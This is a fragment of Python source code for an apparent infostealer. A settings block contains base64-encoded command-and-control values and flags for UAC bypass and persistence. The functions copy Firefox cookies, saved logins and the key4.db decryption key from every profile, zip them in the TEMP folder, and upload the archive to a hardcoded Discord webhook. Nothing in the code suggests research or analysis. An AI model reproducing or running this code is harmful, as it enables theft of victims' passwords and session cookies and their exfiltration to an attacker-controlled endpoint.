...
class Settings:
    C2 = (0, base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIyMTAzMzc0MTA0NTIwMjk4NC9udHBQbFhTSEpDYVlhZ1BJWFVYWldGNWNTeExBMEF1RGxWVVgxUVlQNjVoaWVBbUc3d3RlQnZuVnQ1Z3ZQYU4zOVcyWQ==').decode())
    Mutex = base64.b64decode('bmI5NHFKTnhCaFpnT0pUMg==').decode()
    PingMe = bool('')
    Vmprotect = bool('')
    Startup = bool('')
    Melt = bool('')
    UacBypass = bool('')
    ArchivePassword = base64.b64decode('cm9vdGNvZDNy').decode()
...
def create_logs_folder():
    temp_dir = os.path.join(os.environ.get('TEMP', 'C:\\temp'), 'logs')
    os.makedirs(temp_dir, exist_ok=True)
    return temp_dir

def get_firefox_profiles():
    profiles_dir = os.path.expanduser('~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\')
    profiles = [os.path.join(profiles_dir, f) for f in os.listdir(profiles_dir) if os.path.isdir(os.path.join(profiles_dir, f))]
    return profiles

def copy_cookies_passwords_and_key(profiles, logs_folder):
    for profile in profiles:
        profile_name = os.path.basename(profile)
        profile_folder = os.path.join(logs_folder, profile_name)
        os.makedirs(profile_folder, exist_ok=True)
        cookies_db = os.path.join(profile, 'cookies.sqlite')
        passwords_db = os.path.join(profile, 'logins.json')
        key_db = os.path.join(profile, 'key4.db')
        shutil.copy(cookies_db, profile_folder)
        shutil.copy(passwords_db, profile_folder)
        shutil.copy(key_db, profile_folder)

def zip_logs_folder(logs_folder):
    zip_file = os.path.join(os.path.dirname(logs_folder), 'logs.zip')
    with zipfile.ZipFile(zip_file, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(logs_folder):
            for file in files:
                zipf.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), logs_folder))
    return zip_file

def send_to_discord_webhook(zip_file, webhook_url):
    with open(zip_file, 'rb') as f:
        payload = {"file": ("logs.zip", f)}
        requests.post(webhook_url, files=payload)

def main():
    logs_folder = create_logs_folder()
    profiles = get_firefox_profiles()
    copy_cookies_passwords_and_key(profiles, logs_folder)
    zip_file = zip_logs_folder(logs_folder)
    webhook_url = "https://discord.com/api/webhooks/1246075447960403968/zgnGlMuHkb88jNGWWPCp5iWCG38d-Sf2neZ81_SKn4W9FWwiK_nhWmZ0WzrbCNIsxNfw"
    send_to_discord_webhook(zip_file, webhook_url)
